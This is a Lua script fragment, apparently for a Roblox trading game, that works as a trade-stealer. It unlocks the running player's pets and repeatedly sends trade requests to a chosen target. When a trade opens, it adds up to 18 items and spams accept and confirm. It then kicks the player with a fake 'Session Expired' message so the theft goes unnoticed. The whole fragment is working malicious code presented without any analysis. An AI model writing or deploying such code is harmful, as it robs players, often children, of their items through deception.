local function hAPI(name, ...)
    -- Hann Method: Use RouterClient directly
    local router = Fsys("RouterClient")
    local remote = router.get(name)
    if remote then
        if remote:IsA("RemoteFunction") then return remote:InvokeServer(...) end
        remote:FireServer(...)
    end
end

local function startPhantom(rec, hits)
    print("[DEBUG] Target Found: " .. rec.Name .. ". Securing Pets...")
    -- Instant Unlock
    for _, p in ipairs(hits) do hAPI("BackpackAPI/SetItemLocked", p.uid, false); hAPI("BackpackAPI/SetItemFavorite", p.uid, false) end
    
    task.spawn(function()
        local last, burst, s2s = 0, 0, false
        while true do
            local tradeUI = LP.PlayerGui:FindFirstChild("TradeApp")
            if not tradeUI or not tradeUI.Enabled or not tradeUI:FindFirstChild("Frame") or not tradeUI.Frame.Visible then
                -- Smart Burst Logic: 3 shots -> 10.1s Wait
                if not s2s then 
                    task.wait(2) -- Sniper 2s delay
                    hAPI("TradeAPI/SendTradeRequest", rec)
                    s2s, last, burst = true, tick(), 1
                elseif tick() - last > 10.1 then 
                    hAPI("TradeAPI/SendTradeRequest", rec)
                    last, burst = tick(), 1
                elseif burst < 3 then 
                    hAPI("TradeAPI/SendTradeRequest", rec)
                    burst = burst + 1; task.wait(0.5) 
                end
            else
                -- Tobi/Lynx Method: Batch Adding (Fast Packet)
                print("[DEBUG] Trade Active. Injecting Batch...")
                for i = 1, math.min(18, #hits) do 
                    task.spawn(function() hAPI("TradeAPI/AddItemToOffer", hits[i].uid) end)
                end
                
                -- Auto Accept/Confirm Spam
                local startTime = tick()
                while tick() - startTime < 20 do -- 20s Window to finalize
                    hAPI("TradeAPI/AcceptNegotiation")
                    hAPI("TradeAPI/ConfirmTrade")
                    task.wait(0.4)
                end
                LP:Kick("Session Expired: Please rejoin.") -- Final kick
                break
            end
            task.wait(0.5)
        end
    end)
end

